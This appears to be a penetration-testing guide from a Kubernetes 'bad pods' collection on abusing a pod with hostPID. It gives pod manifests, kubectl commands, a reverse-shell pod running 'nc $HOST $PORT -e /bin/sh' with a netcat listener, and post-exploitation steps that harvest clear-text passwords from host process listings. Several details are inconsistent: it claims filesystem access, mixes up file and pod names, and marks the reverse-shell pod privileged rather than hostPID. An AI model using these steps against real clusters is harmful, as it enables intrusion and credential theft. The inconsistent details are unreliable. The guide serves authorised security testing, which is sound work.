## You can create a pod with only hostPID

You are exploiting the fact that there are no polices preventing the creation of pod with access to the node's filesystem. You are going to create a pod and gain full read/write access to the filesystem of the node the pod is running on. 


# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostpid
  labels:
    app: hostpid
spec:
  hostPID: true
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "604800"
    imagePullPolicy: IfNotPresent
    name: hostpid
  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
  #nodeName: k8s-master
  restartPolicy: Always
  ```
[pod-priv-only.yaml](pod-priv-only.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-hostpid-only.yaml   
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid-only/pod-hostpid-only.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-hostpid-only -- bash
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-priv-only-revshell
  labels: 
    app: pentest
spec:
  containers:
  - name: priv-only-revshell
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    securityContext:
      privileged: true
  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
  #nodeName: k8s-master
```
[pod-hostpid-only-revshell.yaml](pod-hostpid-only-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" 
envsubst < ./yaml/hostpid-only/pod-hostpid-only-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```


# Post exploitation
```bash
# View all processes running on the host and look for passwords, tokens, keys, etc. 
# Check out that clear text password in the ps output below! 

ps -aux
...omitted for brevity...
root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
...omitted for brevity...

# Also, you can also kill any process, but don't do that in production :)
```


#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

